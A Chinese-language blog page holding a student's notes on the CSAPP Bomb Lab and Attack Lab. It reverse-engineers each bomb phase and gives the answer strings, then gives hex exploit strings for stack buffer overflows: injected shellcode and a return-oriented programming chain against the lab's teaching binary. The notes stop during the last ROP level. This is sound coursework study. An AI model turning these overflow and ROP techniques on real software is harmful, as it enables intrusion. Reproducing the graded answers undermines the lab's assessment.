@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="CSAPP的实验笔记（网址http:&#x2F;&#x2F;csapp.cs.cmu.edu&#x2F;3e&#x2F;labs.html）。真够无聊的…… Bomb Lab 先反汇编，从main开始，依次调用initialize_bomb phase_1 phase_defused...直到phase_6 phase_defused一系列函数。 phase_defused 先从这个被调用了6次的函数看起，因为我估计这个应该相对简单，算">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSAPP实验笔记">
+<meta property="og:url" content="http://example.com/2020/10/26/CSAPP%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="PerodicLaw的个人博客">
+<meta property="og:description" content="CSAPP的实验笔记（网址http:&#x2F;&#x2F;csapp.cs.cmu.edu&#x2F;3e&#x2F;labs.html）。真够无聊的…… Bomb Lab 先反汇编，从main开始，依次调用initialize_bomb phase_1 phase_defused...直到phase_6 phase_defused一系列函数。 phase_defused 先从这个被调用了6次的函数看起，因为我估计这个应该相对简单，算">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-10-26T00:00:00.000Z">
+<meta property="article:modified_time" content="2021-03-21T09:04:11.055Z">
+<meta property="article:author" content="PeriodicLaw">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2020/10/26/CSAPP%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CSAPP实验笔记 | PerodicLaw的个人博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">PerodicLaw的个人博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/26/CSAPP%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="PeriodicLaw">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="PerodicLaw的个人博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CSAPP实验笔记
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-10-26 00:00:00" itemprop="dateCreated datePublished" datetime="2020-10-26T00:00:00+00:00">2020-10-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-21 09:04:11" itemprop="dateModified" datetime="2021-03-21T09:04:11+00:00">2021-03-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>CSAPP的实验笔记（网址<a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/labs.html" class="uri">http://csapp.cs.cmu.edu/3e/labs.html</a>）。真够无聊的……</p>
+<h2 id="bomb-lab">Bomb Lab</h2>
+<p>先反汇编，从<code>main</code>开始，依次调用<code>initialize_bomb</code> <code>phase_1</code> <code>phase_defused</code>...直到<code>phase_6</code> <code>phase_defused</code>一系列函数。</p>
+<h3 id="phase_defused"><code>phase_defused</code></h3>
+<p>先从这个被调用了6次的函数看起，因为我估计这个应该相对简单，算热身一下。</p>
+<p>它会将<code>num_input_string</code>的值和6比较（一个位于<code>0x603760</code>的全局变量，应该是输入过多少次字符串了），如果不相等直接结束。</p>
+<p>随后它调用sscanf，（这里已经优化成用寄存器传参了）r8 rcx rdx分别是三个接收的变量，传入的格式串为0x402619处的<code>"%d %d %s"</code>，输入串则在<code>0x603870</code>，不知道实际是什么。</p>
+<p>如果成功读到3个数，会调用<code>strings_not_equal</code>，参数包括<code>0x402622</code>的<code>"DrEvil"</code>和一个变量（推测这个是刚刚读入的<code>%s</code>）。如果返回0,那么调用<code>puts</code>输出<code>"Curses, you've found the secret phase!" "But finding it and solving it are quite different"</code>；随后调用<code>secret_phase</code>函数。</p>
+<p>不论是否返回0，都会输出<code>"Congratulations! You've defused the bomb!"</code>，随后结束。如果没有成功读到3个数那么直接结束。</p>
+<p>从这里我们可以看出，这是第6关之后的一个隐藏关，需要某个字符串具有<code>%d %d DrEvil</code>的形式才会开启。我们等6关玩完了再解它。</p>
+<h3 id="initialize_bomb"><code>initialize_bomb</code></h3>
+<p>这个函数很短，调用了<code>signal</code>函数，参数包括<code>0x4012a0</code>（函数指针，指向<code>sig_handler</code>）以及一个数2。查阅资料，这个函数用于设置程序对某种信号的响应策略，2是某种信号值常量。</p>
+<p>再看这个信号处理函数，它会输出<code>"So you think you can stop the bomb with ctrl-c, do you?"</code>，sleep 3秒，然后printf<code>"Well..."</code>，fflush stdout，再sleep 1秒，输出<code>"OK. :-)"</code>结束。</p>
+<p>试一下就知道，这个处理其实只是阻断一下Ctrl-C的退出而已，没什么重要的。</p>
+<h3 id="phase_1"><code>phase_1</code></h3>
+<p>也很短，比较一下输入字符串和<code>0x402400</code>即字符串<code>"Border relations with Canada have never been better."</code>（注意有一个点，ASCII码0x2e），失败则调用<code>explode_bomb</code>爆炸。</p>
+<h3 id="phase_2"><code>phase_2</code></h3>
+<p>首先调用<code>read_six_numbers</code>，参数是<code>%rsp=%rsi</code>，然后传入了<code>%rsi + 0/0x4/0x14/0x10/0xc/0x8</code>六个参数（部分寄存器部分栈），以及格式串0x4025c3即<code>"%d %d %d %d %d %d"</code>。如果返回值大于6则结束，否则爆炸。</p>
+<p>随后会进行一系列判断，包括<code>(%rsp)=1</code>、<code>2*(%rsp)=(%rsp+0x4)</code>、<code>2*(%rsp+0x4)=(%rsp+0x8)</code>……其实就是要求输入等比数列<code>1 2 4 8 16 32</code>。</p>
+<h3 id="phase_3"><code>phase_3</code></h3>
+<p>首先用<code>sscanf</code>输入，格式串<code>为0x4025cf</code>的<code>"%d %d</code>，存入<code>%rsp+0xc/0x8</code>。然后要求<code>(%rsp+0x8)&lt;=7</code>，跳转到<code>0x402470+8*(%rsp+0x8)</code>。这是一个表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">402470 7c0f4000 00000000 b90f4000 00000000</span><br><span class="line">402480 830f4000 00000000 8a0f4000 00000000</span><br><span class="line">402490 910f4000 00000000 980f4000 00000000</span><br><span class="line">4024a0 9f0f4000 00000000 a60f4000 00000000</span><br></pre></td></tr></table></figure>
+<p>可以看到，根据<code>(%rsp+0x8)</code>的值为0~7，会跳转到不同的地方，对应会给%eax赋予<code>0xcf 0x137 0x2c3 0x100 0x185 0xce 0x2aa 0x147</code>，随后统一跳转，并要求<code>(%rsp+0xc)=%eax</code>。</p>
+<p>由于前面的要求，<code>(%rsp+0x8)</code>只能为7，从而<code>(%rsp+0xc)</code>只能为0x147也就是327。输入<code>7 327</code>。</p>
+<h3 id="phase_4"><code>phase_4</code></h3>
+<del>
+<p>首先还是用<code>sscanf</code>输入两个数字存入<code>%rsp+0xc/0x8</code>。然后要求<code>0xe&lt;=(%rsp+0x8)</code>，然后调用<code>func4</code>，参数为<code>%edx=0xe</code> <code>%esi=0</code> <code>%edi=(%rsp+0x8)</code>，要求返回0。随后再要求<code>(%rsp+0xc)=0</code>。</p>
+<p><code>func4(a,b,c)</code>是递归函数，首先计算<code>%ecx = d = (((a-b)&gt;&gt;&gt;31)+(a-b))&gt;&gt;1 + b</code>，将其与<code>c</code>相比。如果<code>c&lt;d</code>，返回<code>func4(d-1,b,c)*2</code>；如果<code>c=d</code>，返回0；如果<code>c&gt;d</code>，返回<code>func4(a,d+1,c)*2+1</code>。</p>
+</del>
+<p>很多符号方面的细节感觉搞得不太对。总而言之，这个<code>func4</code>是一个二分的过程，当<code>(a+b)/2=c</code>的时候可以直接结束，因此我们尝试输入<code>7 0</code>，发现直接成功。</p>
+<h3 id="phase_5"><code>phase_5</code></h3>
+<p>首先调用<code>string_length</code>函数，要求长度为6，输入的字符串应该在%rdi=%rbx。然后%rax从0开始逐渐增加到6，这个过程中计算<code>0x4024b0 + (%rax+%rbx) &amp; 0xf</code>，将这个地址对应的字节存入<code>%rsp+%rax+0x10</code>的位置。之后再对<code>0x40245e</code>和<code>%rsp+0x10</code>的字符串调用<code>strings_not_equal</code>，要求返回0（也就是两个字符串相同）。</p>
+<p><code>0x4024b0</code>开始的16个字符为<code>maduiersnfotvbyl</code>。<code>0x40245e</code>开始的字符串为<code>flyers</code>。这应该是某种置换过程，对应观察，输入的六个字符的低16位应该分别为<code>0x9 0xf 0xe 0x5 0x6 0x7</code>。在ASCII的小写字母区查找（不在小写字母区应该也可以，但我没有试了），对应字符串应该为<code>ionefg</code>，确实可行。</p>
+<h3 id="phase_6"><code>phase_6</code></h3>
+<p>首先还是调用<code>read_six_numbers</code>，参数同样是%rsp，所以传入的6个数仍然是<code>%rsp + 0/0x4/0x14/0x10/0xc/0x8</code>。然后和变帽子一样把值在寄存器里传来传去：</p>
+<p><code>%rsp</code>的值存入<code>%r13 %rsi %r14 %rbp，%r12d=0</code>。然后要求<code>(%r13)-0x1&lt;=0x5</code>，并让<code>%ebx=%r12d+1</code>，检查要求<code>(%rsp+%ebx*4)!=(%r13+0)</code>直到<code>%ebx=5</code>，再<code>%r13=%rsp+4</code>，重复循环。 因此可以估计到这个循环是要求所有数大于等于6，并且互不相同，也就是所有数构成1～6的一个排列才对。</p>
+<p>接下来，<code>%rsi=%rsp+0x18</code>，<code>%rax=%r14=%rsp</code>，<code>%ecx=7</code>。然后，<code>%edx=%ecx</code>，并让<code>%edx-=(%rax)</code>，存入<code>(%rax)</code>，<code>%rax+=4</code>，循环直到<code>%rsi=%rax</code>。 这个循环是将6个数从<span class="math inline">\(x\)</span>变成<span class="math inline">\(7-x\)</span>。</p>
+<p>接下来，<code>%rsi=0</code>，检查<code>%ecx=(%rsp+%rsi)</code>，如果小于等于1，将<code>0x6032d0</code>存入<code>(%rsp+2*%rsi+0x20)</code>，<code>%rsi+=4</code>，如果<code>%rsi</code>等于0x18，就结束循环；否则，重复上面的操作。 如果大于1，<code>%eax=1</code>，<code>%edx=0x6032d0</code>，然后一个新循环，<code>%rdx=(%rdx+0x8)</code>，<code>%eax+=1</code>，比较<code>%ecx</code>与<code>%eax</code>，如果不等则继续此循环，相等则将%rdx存入<code>(%rsp+2*%rsi+0x20)</code>，<code>%rsi+=4</code>，检查大循环条件。</p>
+<p>这整个循环比较复杂，<code>%rsp+0x20</code>开始的是一个新的数组。考察一下<code>0x6032d0</code>的内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">6032d0 4c010000 01000000 e0326000 00000000</span><br><span class="line">6032e0 a8000000 02000000 f0326000 00000000</span><br><span class="line">6032f0 9c030000 03000000 00336000 00000000</span><br><span class="line">603300 b3020000 04000000 10336000 00000000</span><br><span class="line">603310 dd010000 05000000 20336000 00000000</span><br><span class="line">603320 bb010000 06000000 00000000 00000000</span><br><span class="line">603330 00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure>
+<p>从而，数据的传递链为：<code>0x6032d0 -&gt; 0x6032e0 -&gt; 0x6032f0 -&gt; 0x603300 -&gt; 0x603310 -&gt; 0x603320 -&gt; 0</code>。<strong>我们注意到这其实是一个链表结构。</strong></p>
+<p>所以，这个循环根据输入数的值，在新数组中存入对应的地址，对应关系为：</p>
+<table>
+<thead>
+<tr class="header">
+<th>原来的数</th>
+<th>6</th>
+<th>5</th>
+<th>4</th>
+<th>3</th>
+<th>2</th>
+<th>1</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>7-x处理后</td>
+<td>1</td>
+<td>2</td>
+<td>3</td>
+<td>4</td>
+<td>5</td>
+<td>6</td>
+</tr>
+<tr class="even">
+<td>新数组中</td>
+<td>6032d0</td>
+<td>6032e0</td>
+<td>6032f0</td>
+<td>603300</td>
+<td>603310</td>
+<td>603320</td>
+</tr>
+</tbody>
+</table>
+<p>接下来，<code>%rcx=%rbx=(%rsp+0x20) %rax=%rsp+0x20+0x8 %rsi=%rsp+0x20+0x30</code>。然后循环开始，每轮将<code>%rdx=(%rax)</code>存入<code>(%rcx+8)</code>，再<code>%rax+=8</code>，如果<code>%rax=%rsi</code>就结束循环，否则将上面那个值也就是<code>%rdx</code>存入<code>%rcx</code>，继续循环。循环结束后<code>(%rdx+0x8)=0</code>。 这个循环从1号元素开始，更新了一遍上面的表（指第3 4列）。新数组1号元素对应的表值被存入0号元素对应的表……以此类推。最后一个存入0。<strong>这也就是说我们按照新数组的顺序重排了链表，现在新数组0号元素的后继是新数组1号元素，以此类推。</strong></p>
+<p>最后的最后，<code>%ebp=5</code>，循环开始，<code>%rax=(%rbx+0x8)</code>，<code>%eax=(%rax)</code>，并要求<code>%eax &lt; (%rbx)</code>。之后<code>%rbx=(%rbx+0x8)</code>，<code>%ebp-=1</code>继续循环直到<code>%ebp=0</code>。 很明显这是一种有序性的要求。<strong>具体而言，要求链表从新数组0号元素出发，其值单调递减。</strong>并且，这个要求的是4个字节大小的范围。</p>
+<p>我们甚至可以写出大概的代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">	<span class="keyword">int</span> x;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125; *listhead;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">6</span>];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">b</span>[6];</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">		assert(a[i]&lt;=<span class="number">6</span>);</span><br><span class="line">		a[i] = <span class="number">7</span>-a[i];</span><br><span class="line">		<span class="keyword">if</span>(a[i]&lt;=<span class="number">1</span>)</span><br><span class="line">			b[i] = listhead;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			b[i] = listhead;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j!=a[i]; j++)</span><br><span class="line">				b[i] = b[i]-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">temp</span>;</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">		temp = b[i<span class="number">-1</span>]-&gt;next = b[i];</span><br><span class="line">	&#125;</span><br><span class="line">	temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)</span><br><span class="line">		assert(b[i]-&gt;next-&gt;x &lt; b[i]-&gt;x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>回到原来的链表，表中元素的值以及他们应当对应的新数组位置为：</p>
+<table>
+<thead>
+<tr class="header">
+<th>表地址</th>
+<th>6032d0</th>
+<th>6032e0</th>
+<th>6032f0</th>
+<th>603300</th>
+<th>603310</th>
+<th>603320</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>表中元素</td>
+<td>014c</td>
+<td>00a8</td>
+<td>039c</td>
+<td>02b3</td>
+<td>01dd</td>
+<td>01bb</td>
+</tr>
+<tr class="even">
+<td>对应位置</td>
+<td>4</td>
+<td>5</td>
+<td>0</td>
+<td>1</td>
+<td>2</td>
+<td>3</td>
+</tr>
+</tbody>
+</table>
+<p>从而反推输入的值：</p>
+<table>
+<thead>
+<tr class="header">
+<th>新数组地址</th>
+<th>6032f0</th>
+<th>603300</th>
+<th>603310</th>
+<th>603320</th>
+<th>6032d0</th>
+<th>6032e0</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>反转后输入</td>
+<td>3</td>
+<td>4</td>
+<td>5</td>
+<td>6</td>
+<td>1</td>
+<td>2</td>
+</tr>
+<tr class="even">
+<td>输入值</td>
+<td>4</td>
+<td>3</td>
+<td>2</td>
+<td>1</td>
+<td>6</td>
+<td>5</td>
+</tr>
+</tbody>
+</table>
+<p>输入<code>4 3 2 1 6 5</code>。</p>
+<h3 id="附加关">附加关</h3>
+<p>第6关做的呕吐，所以附加关不做了，直接看网上答案怎么做的就行。</p>
+<h2 id="attack-lab">Attack Lab</h2>
+<p>主要是利用栈的漏洞进行攻击，分为代码注入和面向返回攻击两部分。</p>
+<h3 id="代码注入">代码注入</h3>
+<p>代码顺序<code>main -&gt; stable_launch -&gt; launch -&gt; test</code>。里面主要是处理服务器相关的东西，我们不用管，<code>test</code>的结构说明书上已经写了。</p>
+<h4 id="level-1">Level 1</h4>
+<p>我们的目的是构造特殊的输入，使得缓冲区溢出，从而跳转到<code>touch1</code>函数。用gdb执行调试，在<code>getbuf</code>开始时停顿，反汇编。 我们可以看到，<code>%rsp-0x28</code>是buf的开始位置，返回地址存放于<code>%rsp</code>处，而<code>touch1</code>的值为<code>0x4017c0</code>。 我们只需要前0x28=40个字符非换行（比如，空格0x20），然后再8个字符等于返回地址<code>0x00000000004017c0</code>即可，答案如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">c0 17 40 00</span><br><span class="line">00 00 00 00</span><br></pre></td></tr></table></figure>
+<h4 id="level-2">Level 2</h4>
+<p>我们需要构造一段程序，将%rdi赋予cookie（<code>0x59b997fa</code>），然后通过ret函数跳转到<code>touch2</code>函数。为此我们需要构造如下的程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov $0x59b997fa, %rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>buf开始的先存放这部分代码，末尾存放指向这个代码的返回地址；末尾的后面则要再追加<code>touch2</code>的地址<code>0x4017ec</code>（用于上面的<code>ret</code>指令，注意栈是从高地址往低地址增长的，出栈则会反过来）。 此外通过<code>gdb</code>可以得知，buf的起始地址为<code>0x5561dc78</code>，这就是第一个返回地址。答案如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa</span><br><span class="line">97 b9 59 c3</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">78 dc 61 55</span><br><span class="line">00 00 00 00</span><br><span class="line">ec 17 40 00</span><br><span class="line">00 00 00 00</span><br></pre></td></tr></table></figure>
+<h4 id="level-3">Level 3</h4>
+<p>我们需要构造一段程序，将一个指向内容为<code>"59b997fa"</code>的字符串指针赋给%rdi，然后调用<code>touch2</code>。</p>
+<p>根据ASCII对应，这个字符串应该为<code>35 39 62 39 39 37 66 61 00</code>。 <del>不妨将这个字符串就存放在第一个返回地址的前面，可以计算出这个位置为<code>0x5561dc78+0x28-0x9=0x5561dc97</code>。</del> 根据说明书的指导，我们不能放在这种位置，<strong>因为它会被<code>hexmatch</code>等函数所使用的堆栈覆盖掉</strong>。</p>
+<p>我们需要把字符串放在第二个返回地址的后面，可以计算出这个位置为<code>0x5561dc78+56=0x5561dcb0</code>。 程序代码不需要动，把立即数响应修改一下就可以了。 第二个返回地址也应该修改为<code>touch3</code>的地址<code>0x4018fa</code>。答案如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 b0</span><br><span class="line">dc 61 55 c3</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">78 dc 61 55</span><br><span class="line">00 00 00 00</span><br><span class="line">fa 18 40 00</span><br><span class="line">00 00 00 00</span><br><span class="line">35 39 62 39</span><br><span class="line">39 37 66 61</span><br><span class="line">00</span><br></pre></td></tr></table></figure>
+<h3 id="面向返回攻击">面向返回攻击</h3>
+<p>面向返回攻击的大概思想是，由于x86的编码机制，可以从指令的中间截断并将后半部分视为一个新指令；我们希望在已有的程序中发掘一些形如“<strong>有用的指令+ret</strong>”的片段，将它们组合成一段可用的程序。</p>
+<h4 id="level-2-1">Level 2</h4>
+<p>我们在<code>start_farm</code>到<code>mid_farm</code>中间一段的代码中寻找可能有用的片段。</p>
+<p><code>getval_280</code>的指令片段<code>58 90 c3</code>对应代码<code>popq %rax; nop; retq</code>，起始地址<code>0x4019ca+2=0x4019cc</code>。</p>
+<p><code>addval_273</code>的指令片段<code>48 89 c7 c3</code>对应代码<code>mov %rax, %rdi; reqt</code>，起始地址<code>0x4019a0+2=0x4019a2</code>。</p>
+<p>有了这两段指令，我们从栈上取出<code>0x59b997fa</code>到<code>%rax</code>，再传入<code>%rdi</code>，调用<code>touch2</code>，完成。<strong>还是注意栈从高往低增长，所以我们的地址从低往高放。</strong>答案为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">cc 19 40 00</span><br><span class="line">00 00 00 00</span><br><span class="line">fa 97 b9 59</span><br><span class="line">00 00 00 00</span><br><span class="line">a2 19 40 00</span><br><span class="line">00 00 00 00</span><br><span class="line">ec 17 40 00</span><br><span class="line">00 00 00 00</span><br></pre></td></tr></table></figure>
+<h4 id="level-3-1">Level 3</h4>
+<p>首先考虑一下我们的思路。我们会在栈上构造一个<code>"59b997fa"</code>，并希望将它的地址传给<code>%edi</code>。但是，由于栈随机化的存在，我们需要将<code>%rsp</code>的值传给<code>%rdi</code>，然后用<code>popq</code>指令调整到正确的返回地址。</p>
